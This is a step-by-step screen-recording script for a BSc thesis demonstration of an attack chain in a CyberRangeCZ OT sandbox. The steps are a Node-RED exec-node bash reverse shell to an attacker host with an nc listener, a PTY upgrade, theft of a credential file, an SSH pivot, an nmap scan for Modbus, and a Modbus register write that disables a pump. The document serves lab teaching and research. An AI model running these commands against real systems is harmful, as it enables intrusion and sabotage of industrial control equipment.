# Thesis Screen Recording Guide & Walkthrough Script
*BSc Thesis Proof-of-Work: Complex OT Sandbox Demonstration (CyberRangeCZ)*

This checklist and step-by-step recording guide ensures you capture all the necessary components of your working OT sandbox before returning your hardware. The recording serves as permanent proof of reproducibility for your thesis appendix and presentation.

---

## 📹 Recording Settings (Best Practices)
* **Resolution:** 1080p (1920x1080) at 30 or 60 FPS.
* **Layout:** Clean desktop, close all unrelated tabs (personal emails, chats, unrelated code files).
* **Terminal Font:** Increase font size (zoom in 2–3 times) so shell outputs are easily legible on video.
* **Audio:** Optional (a silent video with clean, typed text is standard, but you can record voiceover).

---

## 🗂️ Pre-Recording Checklist
- [ ] Sandbox Pool (ID 53) is active in the CyberRangeCZ Portal.
- [ ] Kali Attacker Host (`10.10.10.50`), SCADA HMI (`192.168.100.10`), EWS (`192.168.20.20`), and OpenPLC (`192.168.20.10`) VMs are fully booted and active.
- [ ] No flag file exists on EWS (`/var/log/safety_override.txt` is removed).
- [ ] PLC holding register 0 is set to `1` (normal operation).
- [ ] Terminal window is open on Kali with two tabs:
  - Tab 1: Attacker shell (ready for `nc`).
  - Tab 2: Browser open to Node-RED HMI editor (`http://192.168.100.10:1880`).

---

## 🎬 Step-by-Step Recording Script

### Section 1: The Portal & Topology Visualization (Duration: ~45s)
1. **Start Screen:** Show the CyberRangeCZ Portal dashboard showing your active OT pool.
2. **Definition Details:** Navigate to the Sandbox Definition detail view. Point out the single-homed VM layout.
3. **OpenStack Backend (Optional but good):** Briefly open a terminal showing `openstack server list --all-projects` to show the underlying VMs running on the KVM hypervisor.

---

### Section 2: SCADA Node Entry via Node-RED (Duration: ~1m)
1. **Exposure:** Show the browser connecting to the unauthenticated Node-RED interface:
   `http://192.168.100.10:1880/`
2. **Flow Verification:** Show the simple flow: an `inject` node wired to an `exec` node.
3. **Payload Inspection:** Double-click the `exec` node to show the shell command:
   ```bash
   bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
   ```
4. **Listener Setup:** Switch to the Kali terminal and show you starting the listener:
   ```bash
   nc -nlvp 4444
   ```
5. **Execution:** Switch back to the browser, click **Deploy**, and then click the square button on the `inject` node to trigger the reverse shell.

---

### Section 3: Interactive TTY Upgrade & Credentials (Duration: ~1m)
1. **Dumb Shell Demonstration:** Switch to the terminal. Show that the connection from `192.168.100.10` has been caught.
2. **Demonstrate Constraint:** Attempt to run `ssh operator@192.168.20.20`. Show that the cursor hangs or fails to capture the password input because there is no controlling PTY. Press `Ctrl+C`.
3. **TTY Upgrade:** Run the Python PTY upgrade snippet:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
   Show your prompt changing to `root@scada-hmi:~#`.
4. **Credential Extraction:** Read the leaked engineering credentials stored on the HMI filesystem:
   ```bash
   cat /home/debian/ews_credentials.txt
   ```
   Show the output: `operator : operator123`.

---

### Section 4: Lateral Movement Pivot & Recon (Duration: ~1m)
1. **SSH Pivot:** From the HMI terminal, SSH into the Engineering Workstation:
   ```bash
   ssh operator@192.168.20.20
   ```
   Type password `operator123` when prompted. Show the prompt changing to `operator@engineering-station:~$`.
2. **Control Network Recon:** Run the targeted port scan to locate the PLC:
   ```bash
   nmap -p 502 --open 192.168.20.0/24
   ```
   Show port 502 (Modbus TCP) returning open on `192.168.20.10`.

---

### Section 5: Modbus Sabotage & Flag Verification (Duration: ~1m)
1. **Sabotage Injection:** Write `0` to register 0 on the PLC using the Modbus CLI utility:
   ```bash
   modbus 192.168.20.10 0=0
   ```
2. **Flag Retrieval:** Read the log generated on EWS by the safety monitor script:
   ```bash
   cat /var/log/safety_override.txt
   ```
   Show the final flag clearly on screen:
   `FLAG{PUMP_DISABLED_SUCCESS}`
3. **End Screen:** Close the terminal. Display the topology map one last time.

---

## 📌 Post-Recording Verification
* Review the recorded video to ensure all command entries, terminal outputs, and portal tabs are clear and sharp.
* Save the file as ` Bsc_Thesis_OT_Pivot_Walkthrough.mp4` on your backup storage.
